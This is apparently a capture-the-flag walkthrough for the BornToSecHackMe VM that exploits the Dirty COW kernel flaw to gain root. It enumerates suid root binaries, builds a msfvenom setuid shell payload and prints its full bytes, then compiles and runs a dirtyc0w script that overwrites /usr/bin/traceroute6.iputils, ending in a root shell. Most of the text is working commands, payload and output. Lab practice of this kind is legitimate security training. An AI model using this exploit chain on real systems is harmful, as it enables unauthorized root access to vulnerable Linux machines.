# dirtyc0w - suid root shell

For this exploit, we will be binaries that are suid root and can be used to gain a shell with root privileges.

```
zaz@BornToSecHackMe:~$ find /usr/bin /bin /usr/sbin /sbin -user root -perm -4000 -type f | xargs ls -l
-rwsr-xr-x 1 root root  26252 May 15  2015 /bin/fusermount
-rwsr-xr-x 1 root root  88760 Jun 18  2014 /bin/mount
-rwsr-xr-x 1 root root  34740 Nov  8  2011 /bin/ping
-rwsr-xr-x 1 root root  39116 Nov  8  2011 /bin/ping6
-rwsr-xr-x 1 root root  31116 Sep 13  2012 /bin/su
-rwsr-xr-x 1 root root  67720 Jun 18  2014 /bin/umount
-rwsr-xr-x 1 root root  13908 Mar  5  2015 /sbin/mount.ecryptfs_private
-rwsr-xr-x 1 root root  40292 Sep 13  2012 /usr/bin/chfn
-rwsr-xr-x 1 root root  31748 Sep 13  2012 /usr/bin/chsh
-rwsr-xr-x 1 root root  57956 Sep 13  2012 /usr/bin/gpasswd
-rwsr-xr-x 1 root root  56208 Jul 28  2011 /usr/bin/mtr
-rwsr-xr-x 1 root root  30896 Sep 13  2012 /usr/bin/newgrp
-rwsr-xr-x 1 root root  41284 Sep 13  2012 /usr/bin/passwd
-rwsr-xr-x 2 root root  69708 Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 2 root root  69708 Mar 12  2015 /usr/bin/sudoedit
-rwsr-xr-x 1 root root  14012 Nov  8  2011 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root dip  301904 Apr 21  2015 /usr/sbin/pppd
```

For this example, we will be using the `/usr/bin/traceroute6.iputils` binary since it is one of the lighter binaries with suid root privileges.

Let's generate an adapted payload with `msfvenom`.
```
zaz@BornToSecHackMe:~$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```
```
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -platform Linux -p linux/x86/exec CMD="/bin/bash" PrependSetuid=true -f elf -a x86 -o payload
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder specified, outputting raw payload
Payload size: 52 bytes
Final size of elf file: 136 bytes
Saved as: payload
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ xxd -i payload
unsigned char payload[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int payload_len = 136;
```

Then, we can use this payload in our `scripts/dirtyc0w_suid_shell.c` script. Let's `scp ./scripts/dirtyc0w_suid_shell.c zaz@10.11.250.227:/tmp/dirtyc0w_suid_shell.c`, compile it and run it.
```
zaz@BornToSecHackMe:/tmp$ gcc -pthread dirtyc0w_suid_shell.c -o dirtyc0w_suid_shell -lcrypt
zaz@BornToSecHackMe:/tmp$ ./dirtyc0w_suid_shell 
/usr/bin/traceroute6.iputils successfully backed up to /tmp/traceroute6.iputils.bak
mmap: b7e0b000
madvise 0

ptrace 0
Done! Check /usr/bin/traceroute6.iputils to see if it was modified.

DON'T FORGET TO RESTORE! $ mv /tmp/traceroute6.iputils.bak /usr/bin/traceroute6.iputils
Done! Check /usr/bin/traceroute6.iputils to see if it was modified.

DON'T FORGET TO RESTORE! $ mv /tmp/traceroute6.iputils.bak /usr/bin/traceroute6.iputils
zaz@BornToSecHackMe:/tmp$ /usr/bin/traceroute6.iputils 
root@BornToSecHackMe:/tmp# id
uid=0(root) gid=1005(zaz) groups=0(root),1005(zaz)
root@BornToSecHackMe:/tmp# whoami
root
```

We have gained a shell with root privileges.
